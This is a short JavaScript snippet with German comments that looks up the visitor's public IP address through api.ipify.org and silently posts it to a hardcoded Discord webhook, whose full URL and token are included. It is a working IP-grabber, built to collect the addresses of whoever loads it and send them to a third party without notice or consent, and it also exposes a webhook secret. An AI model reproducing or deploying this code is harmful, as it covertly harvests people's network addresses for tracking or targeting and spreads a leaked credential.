// IP-Adresse abrufen
fetch("https://api.ipify.org?format=json")
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;
    const webhookUrl = "https://discord.com/api/webhooks/1419580060041609309/nEogJD_MFi2WHcypOz_p93vcXH-EHGUI-F74KYaoed014rwBJnJZT0FMyaA8HRPhNJKq";

    // Nachricht formatieren (nur IP)
    const payload = {
      content: `📌 Neue IP-Adresse: \`${ip}\``
    };

    // An Discord senden
    fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    }).catch(err => {
      console.error("Fehler beim Senden an Discord:", err);
    });
  })
  .catch(err => {
    console.error("Fehler beim Abrufen der IP-Adresse:", err);
  });
